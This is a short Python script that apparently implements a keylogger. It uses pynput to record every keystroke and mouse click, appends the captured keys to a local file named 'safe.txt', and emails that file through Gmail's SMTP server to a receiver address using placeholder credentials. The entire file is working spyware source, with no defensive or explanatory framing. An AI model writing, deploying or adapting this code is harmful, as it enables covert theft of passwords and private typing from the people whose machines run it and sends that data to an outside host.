from pynput.keyboard import Key, Listener
from pynput import mouse

import smtplib

keys = []




def on_click(x, y, button, pressed):
    if pressed:
        print("clicked")
        save()
        send_mail()

def on_press(key):
    global keys

    keys.append(key)
    print("{0} pressed".format(key))
    if key == Key.enter:
        save()
        send_mail()
def on_release(key):
    if key == Key.esc:
        return False


def write_file(keys):

    with open("safe.txt", "a") as f:

        for key in keys:
            f.write(key)


def save():
    write_file(f"{(keys)}\n")
    keys.clear()

def send_mail():
    sender = "sender@gmail.com"
    receiver = "reciever@gmail.com"
    password = "Senderpassword"
    with open("safe.txt", "r") as f:
        message = f.read()

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(sender, password)

    server.sendmail(sender, receiver, message)

controller = mouse.Listener(
    on_click=on_click)
controller.start()

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
# 